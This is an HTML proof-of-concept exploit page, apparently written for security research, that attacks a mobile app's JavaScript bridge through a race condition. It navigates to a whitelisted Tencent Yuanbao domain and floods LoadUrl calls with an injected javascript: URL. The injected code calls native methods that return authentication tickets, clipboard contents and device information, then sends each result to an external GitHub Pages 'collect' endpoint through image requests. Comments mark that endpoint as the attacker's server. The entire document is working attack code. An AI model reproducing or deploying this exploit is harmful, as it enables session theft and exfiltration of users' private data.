<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race Final - Ticket Steal</title></head>
<body>
<h2>JSBridge Race - Ticket Steal</h2>
<pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

var callCount = 0;
function callJSBridge(module, method, param, cbName) {
    callCount++;
    var callId = module + '_' + method + '_' + callCount + '_' + Date.now();
    if (!cbName) cbName = 'cb_' + callId.replace(/[^a-zA-Z0-9_]/g, '_');
    var req = { callback: cbName, module: module, method: method, param: param || {}, callId: callId };
    window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
}

// 攻击者服务器（用 GitHub Pages 404 做标记，实际换成自己的）
var EXFIL = "https://zhuos6678-test.github.io/huiyitest112233.github.io/collect";

// 构造注入代码：在 yuanbao 页面上注册 callback + 调用 GetTicket + 外传
var PAYLOAD = [
    // 注册 callback 函数
    'window._s9=function(d){',
    '  try{document.title="W9:"+d;',
    '  new Image().src="' + EXFIL + '?t=w9&d="+encodeURIComponent(d);}catch(e){}',
    '};',
    'window._s10=function(d){',
    '  try{document.title="W10:"+d;',
    '  new Image().src="' + EXFIL + '?t=w10&d="+encodeURIComponent(d);}catch(e){}',
    '};',
    'window._s14=function(d){',
    '  try{document.title="W14:"+d;',
    '  new Image().src="' + EXFIL + '?t=w14&d="+encodeURIComponent(d);}catch(e){}',
    '};',
    // 调用 GetTicket W9/W10/W14
    'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_s9",module:"CommonPlugin",method:"GetTicket",param:{type:"W9"},callId:"s9"}));',
    'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_s10",module:"CommonPlugin",method:"GetTicket",param:{type:"W10"},callId:"s10"}));',
    'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_s14",module:"CommonPlugin",method:"GetTicket",param:{type:"W14"},callId:"s14"}));',
    // 也获取剪贴板和设备信息
    'window._clip=function(d){new Image().src="' + EXFIL + '?t=clip&d="+encodeURIComponent(d);};',
    'window._dev=function(d){new Image().src="' + EXFIL + '?t=dev&d="+encodeURIComponent(d);};',
    'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_clip",module:"CommonPlugin",method:"GetClipboard",param:{},callId:"clip"}));',
    'JSCallJavaMgr.JSCallNative(JSON.stringify({callback:"_dev",module:"DevicePlugin",method:"GetDeviceInfo",param:{},callId:"dev"}));'
].join('');

var JS_URL = 'javascript:void(' + PAYLOAD + '0)';

function doRace() {
    if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
    addLog('=== Race Final: Ticket Steal ===');
    addLog('URL: ' + location.href);
    addLog('Payload length: ' + JS_URL.length);

    // navigate 到白名单域名
    location.href = "https://yuanbao.tencent.com/";

    // 竞态窗口：注入 javascript: URL
    var delays = [0, 20, 40, 60, 80, 100, 130, 160, 200, 250, 300, 400, 500];
    for (var d = 0; d < delays.length; d++) {
        (function(delay) {
            setTimeout(function() {
                try {
                    callJSBridge('CommonPlugin', 'LoadUrl', {url: JS_URL}, 'cb_inject_' + delay);
                } catch(e) {}
            }, delay);
        })(delays[d]);
    }

    // setInterval 高频
    var ivCount = 0;
    var iv = setInterval(function() {
        ivCount++;
        try {
            callJSBridge('CommonPlugin', 'LoadUrl', {url: JS_URL}, 'cb_iv_' + ivCount);
        } catch(e) { clearInterval(iv); }
        if (ivCount > 200) clearInterval(iv);
    }, 0);

    addLog('Race started');
}

setTimeout(function() {
    addLog('Starting in 2s...');
    setTimeout(doRace, 2000);
}, 500);
</script>
</body>
</html>
